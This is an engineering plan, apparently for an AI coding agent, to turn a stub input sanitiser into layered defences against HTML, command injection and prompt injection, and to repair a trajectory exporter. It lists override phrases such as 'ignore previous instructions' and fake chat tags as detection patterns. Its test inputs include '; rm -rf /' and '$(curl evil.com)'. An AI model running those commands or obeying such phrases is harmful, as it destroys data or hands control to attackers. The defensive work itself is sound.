# Plan 45: Redesign InputSanitiser with real defense logic and make TrajectoryExporter functional

> Executor instructions: Follow step by step. Run every verification
> command and confirm expected result before moving on. If a STOP
> condition fires, stop and report — do not improvise. Update the
> status row in `plans/README.md` when done.
>
> Drift check (run first):
> `git diff --stat prompt-44..HEAD -- core/input_sanitiser.py system/trajectory_exporter.py core/memory_router.py tests/test_input_sanitiser.py tests/test_trajectory_exporter.py`
> Also run (read-only drift on a non-edited file that Plan 44 touched):
> `git diff --stat prompt-44..HEAD -- cli/serve.py`
> If any in-scope file changed since prompt-44, compare Current state
> excerpts against live code; on mismatch, STOP. If `cli/serve.py`
> changed, confirm the `input_sanitiser` kwarg is still passed to
> `Orchestrator(...)` — if not, STOP (Plan 44 wiring was reverted).

## Status
- Priority: P2
- Effort: L
- Risk: MED
- Depends on: prompt-44 (InputSanitiser wired into 5 external-input entry points)
- Planned at: commit prompt-44, 2026-06-20
- Revision: REV2 (2026-06-20) — incorporates Claude round-1 review findings 1-4 (layer-order contradiction, `_strip_html` shadowing injection-tag patterns, missing literal-count verification, missing 1:1 coverage mapping)
- Revision: REV3 (2026-06-20) — incorporates Claude round-2 review findings R2-3 (S2/S15 precedence) and R2-4 (injection-tag list extension sub-step). Round-2 findings R2-1 and R2-2 confirmed clean — no edits.

## Why this matters

InputSanitiser is now wired into every external-input entry point (HTTP, WebSocket, Telegram, Web Scraper, Orchestrator.submit_task, QueryHandler.execute) per prompt-44 — but the underlying implementation is a stub: 10 hardcoded literal strings with naive `str.replace`, no HTML stripping, no command injection prevention, no length limits. The wiring is correct; the sink is theatre. A sanitiser that does not sanitise is worse than no sanitiser because it produces false confidence in the audit trail. TrajectoryExporter has had 6 tests skipped since prompt-37.5 because MemoryRouter's API does not support the `fetch(Type, filter_func=...)` pattern the exporter relies on — this is a recurring Rule 19 landmine (skip-then-defer) that must be cleared.

## Current state

**Files in scope (Plan 45 may edit only these):**
- `core/input_sanitiser.py` — current InputSanitiser class. Per handoff prompt-44 description: "10 hardcoded literal strings with naive `str.replace`, no HTML stripping, no command injection prevention, no length limits." Public API: `sanitise(text: str) -> str`. This signature MUST be preserved (5 entry points depend on it: `web/server.py`, `gateways/telegram/gateway.py`, `skills/web_scraper/skill.py`, `core/orchestrator.py::submit_task`, `cli/query_handler.py`).
- `system/trajectory_exporter.py` — exporter with stubbed fetch loop. Per 2026-06-20 audit section 1: lines 88, 96, 100 contain dead code after `return 0` (3 undefined-name occurrences of `records`). Per handoff "Built but not reachable" table: "Backend doesn't support `fetch(Type, filter_func=...)` pattern."
- `core/memory_router.py` — current memory backend. Plan 45 may add ONE new method here (see Step 3). Otherwise out-of-scope.
- `tests/test_input_sanitiser.py` — existing tests. Must not regress. Must extend with real-attack-vector cases (Step 2).
- `tests/test_trajectory_exporter.py` — 6 tests currently marked `@pytest.mark.skip` with `reason` mentioning Plan 45 or prompt-37.5 (per prompt-37.5 closing notes). Must be un-skipped (Step 5).

**Step 0 — verify current state (do this before any edits; paste all output to CHANGELOG entry "Step 0"):**

0.1. `git rev-parse HEAD` — capture commit SHA at plan-start. Paste to CHANGELOG.
0.2. `git ls-remote --tags origin | findstr prompt-44` — confirm prompt-44 tag is on origin. If absent, STOP (prior prompt's tag-push gate was skipped per landmine L5).
0.3. `Get-Content core/input_sanitiser.py` — paste full file contents to CHANGELOG. Confirm: it uses `str.replace` for hardcoded literals and has no regex, no HTML stripping, no length truncation. **Count the distinct hardcoded literal strings passed to `.replace()` calls** (Claude review Finding 3, landmine L7). Paste the count AND the literal list to CHANGELOG. **STOP if the count is not 10** — Current state's "10 hardcoded literals" claim is stale and the plan's pattern-set mapping (Step 1.3 sub-step 1.3b) cannot be verified without an accurate count.
0.4. `Get-Content system/trajectory_exporter.py` — paste full file. Confirm: dead code after `return 0` at lines 88, 96, 100, and the fetch loop relies on a `fetch(Type, filter_func=...)` call.
0.5. `Select-String -Path tests/test_trajectory_exporter.py -Pattern "pytest.mark.skip" -Context 0,1` — confirm exactly 6 skipped tests with `reason` mentioning Plan 45 or prompt-37.5. Paste output to CHANGELOG.
0.6. `Select-String -Path core/memory_router.py -Pattern "def fetch|def scoped_read|def scoped_write|def store|def query"` — list the actual public methods on MemoryRouter. Paste output to CHANGELOG. This determines whether Step 3 adds a new method or refactors the exporter.
0.7. `python -m pytest tests/ -q --tb=no | Select-Object -Last 3` — capture baseline test count. Must match handoff baseline (1134 passed, 61 skipped, 0 failed, 0 warnings). If it does not match, STOP — baseline has drifted since prompt-44 and the plan's Gate 3 baseline is wrong.

If any of these do not match the description above, STOP — the plan was written against stale state.

**Repo conventions (Architecture Rules, handoff lines 437-460):**
- `core/` never imports from `adapters/`, `cli/`, `workers/`, `memory/`, `skills/`, `web/`, or `system/` (Rule 1). `core/input_sanitiser.py` is in `core/` and must not import from any of these.
- `system/` may import from `core/` and `memory/` (Rule 7). `system/trajectory_exporter.py` may import from `core/memory_router.py` only via the public MemoryRouter API.
- All I/O operations are async (Rule 13).
- No broad `except Exception: pass` without inline comment + WARNING trace (Rule 17). All directories are compliant as of prompt-44; Plan 45's new code must preserve this.
- All public functions have return type annotations (Rule 9).
- Exemplar for sanitiser-style code: see `core/approval_gate.py` for the WARNING-trace-on-broad-except pattern established in prompt-41.

## What to change

### Step 1 — Extend InputSanitiser with real defense layers (preserve public API)

Edit `core/input_sanitiser.py`. Keep `sanitise(text: str) -> str` as the only public method. Add private helper methods for each defense layer. The canonical layer order is specified in Step 1.6 below (normalise first, then truncate, then injection-tag strip, then HTML strip, then command-injection strip, then prompt-injection strip). Do not assume any other ordering stated elsewhere in this plan — Step 1.6 is authoritative.

1.1. **Length truncation**: add `_truncate(text: str, *, max_length: int = 10000) -> str`. Default `max_length=10000` characters. If `len(text) > max_length`, truncate and append `...[truncated]`. Emit a WARNING trace event with the original length. (Defends against memory exhaustion and context overflow.)

1.2. **HTML/script tag stripping**: add `_strip_html(text: str) -> str` using `re.sub(r'<[^>]+>', '', text)`. Also strip `javascript:` URIs and `on\w+=` event handler attributes that survive the tag strip. Emit a WARNING trace event if any tags were removed. (Defends against XSS-style content smuggled into the LLM context.) **IMPORTANT — does NOT strip injection-tag patterns** (Claude review Finding 2): the generic `<[^>]+>` regex would silently consume `</thinking>`, `<ignore>`, and `</ignore>` before `_strip_prompt_injection` (Step 1.4) could match them. Those three patterns are detected by a SEPARATE method (`_strip_injection_tags`, Step 1.2b) that runs BEFORE `_strip_html` and emits `[FILTERED:prompt-injection]` instead of silently deleting the text. `_strip_html` only handles generic HTML/script/img/a tags.

1.2b. **Injection-tag detection (runs before `_strip_html`)** (Claude review Finding 2): add `_strip_injection_tags(text: str) -> str` that detects the tag-like prompt-injection markers `</thinking>`, `<ignore>`, `</ignore>`, `<system>`, `</system>`, `<assistant>`, `</assistant>` — any string that would be consumed by the generic `<[^>]+>` regex in `_strip_html` but is semantically a prompt-injection marker, not a real HTML tag. Replace each match with `[FILTERED:prompt-injection]`. Emit a WARNING trace event listing which markers matched. **Rationale**: separating these from `_strip_html` preserves the audit trail (the `[FILTERED:prompt-injection]` marker tells the operator an injection was attempted; silently deleting it would hide the attack).

  1.2b.1. **Extension procedure** (Claude review R2-4 — prevents S16 from being a dead-end STOP): if Step 1.3b's mapping table reveals an original literal (from Step 0.3) that is tag-like (matches the regex `<[^>]+>`) but is NOT in the Step 1.2b marker list, do the following IN ORDER:
    1. Add the missing literal to the Step 1.2b marker list (edit `core/input_sanitiser.py`'s `_strip_injection_tags` pattern set).
    2. Re-run the Step 1.2b verification (the WARNING trace event should now list the new marker when it appears in test input).
    3. Re-run Step 1.3b's mapping table to confirm the originally-uncovered literal now shows coverage (either "subsumed by Step 1.2b" or matched by a Step 1.3 regex).
    4. Paste both re-runs' output to CHANGELOG (before/after the list extension).
    5. Re-evaluate STOP S16 — it should no longer fire for that literal.

    Do NOT improvise an ad hoc fix that bypasses the mapping-table discipline (e.g., silently dropping the literal from coverage, or marking it `@pytest.mark.skip` in tests). The mapping table exists to enforce 1:1 coverage; bypassing it defeats the purpose of Step 1.3b. If the literal cannot be covered without >50 lines of new code, STOP S6 fires (the plan was underscoped — file a follow-up plan).

1.3. **Prompt-injection pattern detection** (non-tag patterns): replace the 10 hardcoded literal strings with a regex-based pattern set. Patterns must cover (at minimum): "ignore previous instructions", "system prompt:", "you are now", "act as". **Note**: the tag-like patterns (`</thinking>`, `<ignore>`, `</ignore>`) are NOT in this set — they are handled by `_strip_injection_tags` (Step 1.2b) to avoid shadowing by `_strip_html` (Claude review Finding 2). Use `re.compile(..., re.IGNORECASE)` for case-insensitive matching. Replace matched patterns with `[FILTERED:prompt-injection]`. Emit a WARNING trace event listing which patterns matched. (Defends against prompt-injection attacks that the old literal-string approach missed due to case/whitespace variants.)

  1.3b. **1:1 coverage verification** (Claude review Finding 4, landmine L7): before finalising the new regex pattern set, paste a mapping table to CHANGELOG showing each of the original 10 hardcoded literals (from Step 0.3's count) mapped to the new regex pattern that covers it. Every original literal MUST have a corresponding regex pattern (or be explicitly subsumed by a broader pattern — e.g., `</thinking>` is subsumed by `_strip_injection_tags`). If any original literal has no coverage, STOP — coverage regression. Paste the mapping table to CHANGELOG.

1.4. **Command-injection pattern detection**: add `_strip_command_injection(text: str) -> str` that detects shell metacharacter sequences commonly used in injection attacks: `;`, `&&`, `||`, `$(`, backticks, `>\s*/`, `rm -rf`. Replace matched sequences with `[FILTERED:command-injection]`. Emit a WARNING trace event. (Defends against command-injection attacks via user-supplied task input.)

1.5. **Unicode normalisation**: add `_normalise(text: str) -> str` using `unicodedata.normalize('NFKC', text)`. This collapses homoglyphs and fullwidth characters that could bypass the regex patterns above. No trace event needed (normalisation is lossless and unconditional).

1.6. **Refactor `sanitise()`**: chain the layers in this canonical order (Claude review Finding 1 — this is the authoritative ordering; any other ordering mentioned elsewhere in the plan is superseded):

  `normalise → truncate → strip_injection_tags → strip_html → strip_command_injection → strip_prompt_injection`

  **Rationale for ordering**:
  - `normalise` first: ensures all downstream regex patterns see NFKC-canonical text (homoglyphs collapsed, fullwidth → ASCII).
  - `truncate` second: bounds memory before any regex work (avoids pathological-input DoS).
  - `strip_injection_tags` third: detects `</thinking>` / `<ignore>` / `</ignore>` BEFORE `_strip_html` can silently consume them (Claude review Finding 2). Replaces with `[FILTERED:prompt-injection]` so the audit trail is preserved.
  - `strip_html` fourth: removes remaining generic HTML/script tags.
  - `strip_command_injection` fifth: detects shell metacharacter sequences.
  - `strip_prompt_injection` last: detects non-tag prompt-injection patterns ("ignore previous instructions" etc.).

  Return the result. Keep the public signature byte-identical: `def sanitise(self, text: str) -> str:`. Do NOT add optional kwargs (preserve API for the 5 entry points).

1.7. **Broad-except compliance (Rule 17)**: every `except Exception` in `input_sanitiser.py` must be followed by an inline comment explaining why the exception is intentionally swallowed, AND a WARNING trace event with the exception message. Use the pattern from `core/approval_gate.py` (established prompt-41).

1.8. **Verification** (Claude review Finding 2 — Gate 7 example extended to exercise the injection-tag path):
```
python -c "from core.input_sanitiser import InputSanitiser; s = InputSanitiser(); print(repr(s.sanitise('<script>alert(1)</script>hello world ignore previous instructions</thinking>; rm -rf /')))"
```
Expected output: a string with `<script>` tags removed (silent deletion — acceptable for generic HTML), `ignore previous instructions` replaced with `[FILTERED:prompt-injection]`, `</thinking>` replaced with `[FILTERED:prompt-injection]` (NOT silently deleted — this is the Finding 2 fix), `; rm -rf /` replaced with `[FILTERED:command-injection]`, and `hello world` preserved. Paste literal output to CHANGELOG. **If `</thinking>` is silently absent from the output (i.e., it was deleted rather than replaced with `[FILTERED:prompt-injection]`), STOP** — the injection-tag detector (Step 1.2b) is not running before `_strip_html` (Step 1.2); the layer order in Step 1.6 was not implemented correctly.

```
ruff check core/input_sanitiser.py
```
Expected: 0 errors. Paste literal output to CHANGELOG.

```
mypy core/input_sanitiser.py --ignore-missing-imports
```
Expected: 0 errors. Paste literal output to CHANGELOG.

### Step 2 — Extend InputSanitiser tests with real attack vectors

Edit `tests/test_input_sanitiser.py`. Add at least one test per defense layer (target: 8-12 new tests). Each test must verify BEHAVIOUR (the sanitised output), not just that the method runs (no `assert True` smoke checks — recurring mistake pattern #2).

2.1. **Length truncation tests**: (a) input below `max_length` is unchanged; (b) input above `max_length` is truncated and ends with `...[truncated]`; (c) empty string is preserved; (d) exactly `max_length` characters is unchanged.

2.2. **HTML stripping tests**: (a) `<script>` tags removed; (b) `<img onerror=...>` event handler removed; (c) `javascript:` URI removed; (d) plain text with no HTML is unchanged.

2.3. **Prompt-injection tests**: (a) "Ignore previous instructions" (capitalised) is filtered; (b) "ignore  previous  instructions" (extra spaces) is filtered; (c) "IGNORE PREVIOUS INSTRUCTIONS" (all caps) is filtered; (d) legitimate text containing the word "instructions" is preserved.

  2.3b. **Injection-tag preservation tests** (Claude review Finding 2 — verifies `</thinking>` / `<ignore>` / `</ignore>` are filtered, not silently deleted by `_strip_html`): (a) `</thinking>` is replaced with `[FILTERED:prompt-injection]` (the substring `[FILTERED:prompt-injection]` MUST appear in the output); (b) `<ignore>` is replaced with `[FILTERED:prompt-injection]`; (c) `</ignore>` is replaced with `[FILTERED:prompt-injection]`; (d) a mixed input like `<script>alert(1)</script></thinking>ignore previous instructions` produces output containing both `[FILTERED:prompt-injection]` (from `</thinking>` and "ignore previous instructions") AND has `<script>` silently removed (because it's a generic HTML tag, not an injection marker).

2.4. **Command-injection tests**: (a) `; rm -rf /` is filtered; (b) `$(curl evil.com)` is filtered; (c) legitimate text with a single `;` (e.g., "hello; world") is preserved (the pattern should match multi-character injection sequences, not single semicolons).

2.5. **Unicode normalisation tests**: (a) fullwidth Latin letters are normalised to ASCII; (b) homoglyphs that would bypass the prompt-injection regex are caught after normalisation.

2.6. **Integration / non-regression**: (a) the existing 5 entry points still work — verify with `tests/test_input_sanitiser_wiring.py` (added prompt-44, 7 tests). These tests must pass without modification.

2.7. **Verification**:
```
python -m pytest tests/test_input_sanitiser.py -v
```
Expected: all tests pass, 0 skipped, 0 failed. Paste `Select-Object -Last 5` of the pytest output to CHANGELOG.

### Step 3 — Add MemoryRouter.fetch_by_type() helper (only if Step 0.6 shows it doesn't exist)

Decision gate: run Step 0.6 first. If `core/memory_router.py` already has a method that supports `fetch(Type, filter_func=...)` semantics, SKIP this step and refactor trajectory_exporter in Step 4 to use it. If no such method exists, add ONE new method:

3.1. Add `async def fetch_by_type(self, record_type: type[T], filter_func: Callable[[T], bool] | None = None) -> list[T]` to `core/memory_router.py`. Implementation: read all records of `record_type` via existing `scoped_read` (or equivalent), apply `filter_func` if provided, return matching records. Add return type annotation (Rule 9).

3.2. **Broad-except compliance (Rule 17)**: any `except Exception` in the new method must have inline comment + WARNING trace event.

3.3. **Architecture Rule 11** ("No memory access outside MemoryRouter"): this method is added TO MemoryRouter, so it complies. trajectory_exporter will call it via the public API.

3.4. **Verification**:
```
Select-String -Path core/memory_router.py -Pattern "def fetch_by_type"
```
Expected: one match. Paste output to CHANGELOG.

```
ruff check core/memory_router.py
```
Expected: 0 NEW errors (pre-existing errors in this file are out-of-scope — enumerate them in CHANGELOG if any remain, but do not fix).

```
mypy core/memory_router.py --ignore-missing-imports
```
Expected: 0 NEW errors in the new method.

### Step 4 — Fix trajectory_exporter to use working fetch pattern

Edit `system/trajectory_exporter.py`. Replace the stubbed fetch loop (the one that calls `fetch(Type, filter_func=...)`) with a real call to `MemoryRouter.fetch_by_type(record_type=..., filter_func=...)` (added in Step 3) OR to the existing MemoryRouter method identified in Step 0.6.

4.1. Identify the exact stub location (paste line numbers to CHANGELOG in Step 0.4).

4.2. Replace the stub with a working call. The replacement must:
   - Call MemoryRouter via its public API only (Rule 11).
   - Handle `filter_func=None` case (fetch all records of the type).
   - Emit a WARNING trace event on `except Exception` (Rule 17).
   - Have a return type annotation (Rule 9).

4.3. **Remove dead code**: per 2026-06-20 audit, lines 88, 96, 100 in `system/trajectory_exporter.py` contain undefined-name references to `records` after a `return 0`. Delete these lines (they are unreachable). Confirm via:
```
ruff check system/trajectory_exporter.py --select F821
```
Expected: 0 errors (was 3 before this step). Paste before/after output to CHANGELOG.

4.4. **Verification**:
```
ruff check system/trajectory_exporter.py
```
Expected: 0 errors. Paste literal output to CHANGELOG.

```
mypy system/trajectory_exporter.py --ignore-missing-imports
```
Expected: 0 errors in the file. Paste literal output to CHANGELOG.

### Step 5 — Un-skip 6 deferred trajectory_exporter tests

Edit `tests/test_trajectory_exporter.py`. Remove the `@pytest.mark.skip` decorator from the 6 tests identified in Step 0.5. Each test must now PASS — not be skipped again for a different reason (landmine L3).

5.1. For each un-skipped test, run it individually first:
```
python -m pytest tests/test_trajectory_exporter.py::<test_name> -v
```
If a test fails, fix the test or the production code (within scope) until it passes. Do NOT mark it `@pytest.mark.skip` again with a different reason. If a test cannot be made to pass without scope creep (>50 lines of new code or touching out-of-scope files), STOP per the STOP conditions.

5.2. **Verification**:
```
python -m pytest tests/test_trajectory_exporter.py -v
```
Expected: all tests pass, 0 skipped, 0 failed. Paste `Select-Object -Last 10` to CHANGELOG.

```
Select-String -Path tests/test_trajectory_exporter.py -Pattern "pytest.mark.skip"
```
Expected: 0 matches (or only matches with `reason` not citing Plan 45 / prompt-37.5). Paste output to CHANGELOG.

## Verification gates (run in order, all must pass)

1. `python -m pytest tests/test_input_sanitiser.py -v` — expected: all tests pass, 0 skipped. Paste `Select-Object -Last 5` literal output.
2. `python -m pytest tests/test_trajectory_exporter.py -v` — expected: all 6 previously-skipped tests now pass; 0 skipped. Paste `Select-Object -Last 10` literal output.
3. `python -m pytest tests/test_input_sanitiser_wiring.py -v` — expected: all 7 tests pass (prompt-44 wiring is intact). Paste literal output.
4. `python -m pytest tests/ -q --tb=no | Select-Object -Last 3` — expected: at-or-above prompt-44 baseline (1134 passed, 61 skipped, 0 failed, 0 warnings). If skip count drops below 61 (because 6 trajectory_exporter tests are un-skipped), that is EXPECTED — target is 1140 passed, 55 skipped, 0 failed. If skip count rises above 61, STOP per STOP conditions. Paste literal output.
5. `ruff check core/input_sanitiser.py system/trajectory_exporter.py core/memory_router.py tests/test_input_sanitiser.py tests/test_trajectory_exporter.py` — expected: 0 errors. (Pre-existing errors in `core/memory_router.py` that predate this plan must be enumerated in CHANGELOG — do not silently leave any new ones.)
6. `mypy core/input_sanitiser.py system/trajectory_exporter.py core/memory_router.py --ignore-missing-imports` — expected: 0 NEW errors introduced by this plan. Paste literal output.
7. Manual smoke (any shell, no interactive requirement — landmine L11). **REV2 (Claude review Finding 2)**: extended to exercise the injection-tag path so `</thinking>` shadowing is caught:
   ```
   python -c "from core.input_sanitiser import InputSanitiser; s=InputSanitiser(); print(repr(s.sanitise('<script>alert(1)</script>hello world ignore previous instructions</thinking>; rm -rf /')))"
   ```
   Expected: a string with `<script>` removed (silent deletion — acceptable for generic HTML), `ignore previous instructions` replaced with `[FILTERED:prompt-injection]`, `</thinking>` replaced with `[FILTERED:prompt-injection]` (NOT silently deleted — this verifies the Step 1.2b injection-tag detector runs before `_strip_html`), `; rm -rf /` replaced with `[FILTERED:command-injection]`, and `hello world` preserved. Paste literal output. **If `</thinking>` is silently absent (i.e., deleted rather than replaced with `[FILTERED:prompt-injection]`), STOP** — Step 1.2b is not running before Step 1.2; the layer order in Step 1.6 was not implemented correctly.

## STOP conditions

- **S0**: If Step 0.1 reveals `HEAD` is not a descendant of `prompt-44` tag, STOP (prompt-44 was not actually merged).
- **S1**: If Step 0.2 shows `prompt-44` tag is absent from origin, STOP (landmine L5: tag-push gate was skipped).
- **S2**: If Step 0.3 reveals `core/input_sanitiser.py` does NOT use `str.replace` with hardcoded literals (i.e., it has been redesigned since prompt-44), STOP — the plan's "Current state" is stale. **Precedence (Claude review R2-3)**: if both S2 and S15 would fire (file redesigned AND literal count ≠ 10), report S2 — a redesigned file makes the literal count moot. Do not evaluate S15 once S2 has fired.
- **S3**: If Step 0.5 reveals fewer than 6 `@pytest.mark.skip` markers in `tests/test_trajectory_exporter.py` citing Plan 45 / prompt-37.5, STOP — they may have been fixed in an untracked change.
- **S4**: If Step 0.6 reveals MemoryRouter already has a `fetch_by_type` or `fetch(Type, filter_func=...)` method, SKIP Step 3 (do not add a duplicate method) — instead refactor trajectory_exporter in Step 4 to use the existing method. Document this in CHANGELOG.
- **S5**: If Step 0.7 reveals the test baseline is NOT 1134 passed / 61 skipped / 0 failed, STOP — baseline has drifted; the plan's Gate 4 target is wrong. Re-baseline before proceeding.
- **S6**: If the fix requires >50 lines of new code in any single step, STOP — the plan was underscoped. File a follow-up plan.
- **S7**: If a file outside the in-scope list needs editing (e.g., a caller of InputSanitiser breaks because the public API changed), STOP — public API must be preserved. The 5 entry points wired in prompt-44 must continue to work without modification.
- **S8**: If Gate 4 shows MORE failures than the prompt-44 baseline (1134 passed, 61 skipped, 0 failed) — i.e., any new failure, OR skip count rises above 61 (excluding the 6 trajectory_exporter tests being un-skipped) — STOP. A regression was introduced. Do not tag.
- **S9**: If un-skipping a trajectory_exporter test (Step 5) requires marking it `@pytest.mark.skip` again for a different reason, STOP (landmine L3: skip-then-defer is forbidden).
- **S10**: If any verification gate is marked PASSED without literal output pasted to CHANGELOG, STOP (landmine L2 / Rule 19).
- **S11**: If the drift check at plan-start shows `cli/serve.py` was modified since prompt-44 AND the `input_sanitiser` kwarg is no longer passed to `Orchestrator(...)`, STOP — Plan 44 wiring was reverted; Plan 45's "do not break wiring" constraint is impossible to verify.
- **S12**: If any closing step (C1-C10 below) is marked DONE without literal output pasted to CHANGELOG, STOP (landmine L2 / Rule 19). Closing steps are gates — same evidence requirement applies.
- **S13**: If C5 (`git show prompt-45 --stat`) reveals a file outside the in-scope list (other than `CHANGELOG.md` and `SOVEREIGN_AI_HANDOFF.md` which are added in C6/C7), STOP — delete the tag with `git tag -d prompt-45`, unstage the out-of-scope file, and re-tag. Do not push the bad tag.
- **S14**: If C10 (`git push origin prompt-45`) succeeds locally but `git ls-remote --tags origin | findstr prompt-45` returns empty, STOP — the tag did not reach origin (landmine L5: tag-push gate skipped). Retry the push. If retry fails, report to user; do not mark Plan 45 complete.
- **S15**: If Step 0.3's literal count is NOT 10, STOP (Claude review Finding 3, landmine L7). Current state's "10 hardcoded literals" claim is stale. Re-baseline the count and revise Step 1.3's pattern set before proceeding.
- **S16**: If Step 1.3b's mapping table shows any original literal with no corresponding regex pattern (or no explicit subsumption by a broader pattern like `_strip_injection_tags`), STOP (Claude review Finding 4). Coverage regression — the redesign dropped protection against an attack the original InputSanitiser caught. **Remediation path (Claude review R2-4)**: if the uncovered literal is tag-like (matches `<[^>]+>`), follow Step 1.2b.1 to extend the injection-tag marker list, then re-evaluate S16. If the uncovered literal is NOT tag-like, STOP and file a follow-up plan — the regex pattern set in Step 1.3 must be extended, which may exceed the >50-line scope budget (S6).

## Closing steps (mandatory, every prompt)

These run AFTER all verification gates (Gates 1-7) pass. Each step requires literal output pasted to CHANGELOG (landmine L2 / Rule 19). Do not batch.

**C1** — Run full test suite:
```
python -m pytest tests/ -v
```
Confirm: zero new failures vs prompt-44 baseline (1134 passed, 61 skipped, 0 failed). Expected after Plan 45: 1140 passed, 55 skipped, 0 failed (6 trajectory_exporter tests un-skipped). Paste `Select-Object -Last 5` literal output to CHANGELOG. If a new failure appears, STOP — Gate 4 was false-positive; revert and re-investigate.

**C2** — Ruff check on all touched files:
```
ruff check core/input_sanitiser.py system/trajectory_exporter.py core/memory_router.py tests/test_input_sanitiser.py tests/test_trajectory_exporter.py
```
Expected: 0 errors. Paste literal output to CHANGELOG. (Pre-existing errors in `core/memory_router.py` that predate Plan 45 must be enumerated — if any remain after Step 3, list them with file:line and reason. Do not silently leave them.)

**C3** — Mypy on all touched files:
```
mypy core/input_sanitiser.py system/trajectory_exporter.py core/memory_router.py --ignore-missing-imports
```
Expected: 0 NEW errors introduced by Plan 45. Paste literal output to CHANGELOG. Pre-existing errors must be enumerated (file:line + reason), not silently left.

**C4** — Commit and tag:
```
git add .
git commit -m "checkpoint: prompt-45"
git tag prompt-45
```
Verify:
```
git log -1 --oneline
git tag --list prompt-45
```
Expected: `prompt-45` appears in both outputs. Paste literal output to CHANGELOG.

**C5** — Verify file list in the tag:
```
git show prompt-45 --stat
```
Expected: file list contains ONLY these files (other than `CHANGELOG.md` and `SOVEREIGN_AI_HANDOFF.md` which are added in C6/C7 — they should NOT appear here because the docs commit is C9, separate from the checkpoint commit in C4):
- `core/input_sanitiser.py`
- `system/trajectory_exporter.py`
- `core/memory_router.py` (only if Step 3 added a method)
- `tests/test_input_sanitiser.py`
- `tests/test_trajectory_exporter.py`

If an unexpected file appears, run `git tag -d prompt-45`, `git reset HEAD~1` (unstage the bad commit), clean, re-commit, re-tag. Do NOT push the bad tag. Paste literal output of `git show prompt-45 --stat` to CHANGELOG.

**C6** — Update `CHANGELOG.md` (append-only). **Per-step CHANGELOG entries required** — do not batch into a single summary at the end (handoff line 263). Each entry must include:
- **Date/time**: `YYYY-MM-DD HH:MM` per handoff line 191.
- **Step reference**: "Plan 45 Step 0", "Plan 45 Step 1", etc.
- **What was done**: concrete actions.
- **What failed (if anything)**: mid-prompt failures and how resolved.
- **Files Modified**: per-file detail (which functions/lines changed).
- **Testing Results**: baseline → final, with the exact command run.
- **Verification Gate Output**: literal output of each gate (Gates 1-7 + Closing steps C1-C3).

Use the CHANGELOG append procedure below (PowerShell, because file locks).

**C7** — Update `SOVEREIGN_AI_HANDOFF.md`:
- Move Plan 45 from "Next 5 prompts" to "Completed prompts" table (handoff line 264). Include the same row format as the existing completed-prompt rows: `| 45 | InputSanitiser redesign + trajectory_exporter functional redesign | 1140 | <one-line result summary> |`.
- Update "What's broken right now" — no items to remove (Plan 45 doesn't fix F4 or any open bug; F4 stays).
- Update "Built but not reachable" table — remove `TrajectoryExporter` row IF Step 4 made it functional. If it's still not reachable from `jarvis` or `jarvis serve`, leave the row but update the "Why it's dormant" column to reflect the new state.
- Update "InputSanitiser wiring status (Rule 14)" line (handoff line 7) — append "; InputSanitiser implementation upgraded from stub to real defence-in-depth (prompt-45)".
- Update test baseline line (handoff line 9) — change "1134 passed, 61 skipped" to "1140 passed, 55 skipped" (or whatever the actual measured count is from C1).
- **Refill the "Next 5 prompts" queue** so it always has 5 entries (handoff line 264). The 2026-06-20 audit recommends the new queue be: Plan 46 (F821 + critical F841, P1), Plan 47 (E402 + missing `gateways/__init__.py`, P2), Plan 48 (ApprovalGate API drift + mypy remediation, P2), Plan 49 (test suite health), Plan 50 (F401 bulk cleanup). Marine stack (handoff's original Plan 49) is deferred until after the audit's P1/P2 cleanup. Update the "Deferred" section to reflect this reprioritisation.
- Update the "Last updated" header (handoff line 3) to `2026-06-20 — post prompt-45, handoff amended by GLM session 7`.

**C8** — Update `global_rules.md` IF a new recurring mistake pattern or landmine was identified during Plan 45 execution. Per handoff line 265: "Rules are behavioral guardrails (not memories) and should be kept current." Add a new step to the plan if needed. Do NOT cite `global_rules.md` as authority in the plan or CHANGELOG — it is Devin-local and unreachable for verification (landmine L1). If no new pattern was identified, skip this step and document the skip in CHANGELOG with reason "no new recurring mistake pattern identified in prompt-45".

**C9** — Commit docs:
```
git add CHANGELOG.md SOVEREIGN_AI_HANDOFF.md global_rules.md
git commit -m "docs: prompt-45 changelog and handoff update"
```
If `global_rules.md` was not modified in C8, omit it from the `git add`:
```
git add CHANGELOG.md SOVEREIGN_AI_HANDOFF.md
git commit -m "docs: prompt-45 changelog and handoff update"
```
Verify:
```
git log -1 --oneline
git show HEAD --stat
```
Expected: commit message is `docs: prompt-45 changelog and handoff update`, file list contains only `CHANGELOG.md` and `SOVEREIGN_AI_HANDOFF.md` (plus `global_rules.md` if C8 ran). Paste literal output to CHANGELOG.

**C10** — Push to origin:
```
git push origin master
git push origin prompt-45
```
**Tag-push gate (landmine L5 — non-negotiable)**: after pushing, verify the tag actually reached origin:
```
git ls-remote --tags origin | findstr prompt-45
```
Expected: a line containing `prompt-45`. If this returns empty, the push was reported as "pushed to remote" but the tag did not actually reach origin (this was the prompt-38 failure mode — handoff line 312). Retry the push. If retry fails, report to user; do NOT mark Plan 45 complete in the CHANGELOG until the tag is verified on origin. Paste literal output of `git ls-remote --tags origin | findstr prompt-45` to CHANGELOG.

## CHANGELOG append procedure (PowerShell, because file locks)

Per handoff lines 269-273. Use these exact PowerShell idioms — do not substitute.

- **Line count**: `[System.IO.File]::ReadAllLines(r"C:\Jarvis\CHANGELOG.md").Count`. NEVER use `Get-Content | Measure-Object` — it truncates large files.
- **Append**: `Add-Content` only. NEVER paste into editor, NEVER use insert operations.
- **Before appending**: record current line count.
- **After appending**: verify new count exceeds previous, verify last 5 lines with `Select-Object -Last 5`.
- **Close the file in the IDE before running `Add-Content`** — file locks will cause silent truncation.
- **Example session for one CHANGELOG entry**:
  ```powershell
  $before = [System.IO.File]::ReadAllLines(r"C:\Jarvis\CHANGELOG.md").Count
  Add-Content -Path r"C:\Jarvis\CHANGELOG.md" -Value @"

  ## 2026-06-20 HH:MM — Plan 45 Step 1

  **What was done**: <concrete actions>

  **Files Modified**:
  - core/input_sanitiser.py: added _truncate(), _strip_html(), _strip_command_injection(), _normalise(); refactored sanitise() to chain layers.

  **What failed**: <none / mid-prompt failures and resolution>

  **Testing Results**: <baseline -> final, with command>

  **Verification Gate Output**:
  ``<literal output of Step 1.8 verification command>``
  "@
  $after = [System.IO.File]::ReadAllLines(r"C:\Jarvis\CHANGELOG.md").Count
  Write-Host "Before: $before, After: $after"
  Get-Content r"C:\Jarvis\CHANGELOG.md" | Select-Object -Last 5
  ```

## Out of scope

The following are explicitly out of scope for Plan 45. Each requires its own plan. Do not bundle — bundling is scope creep (landmine L12).

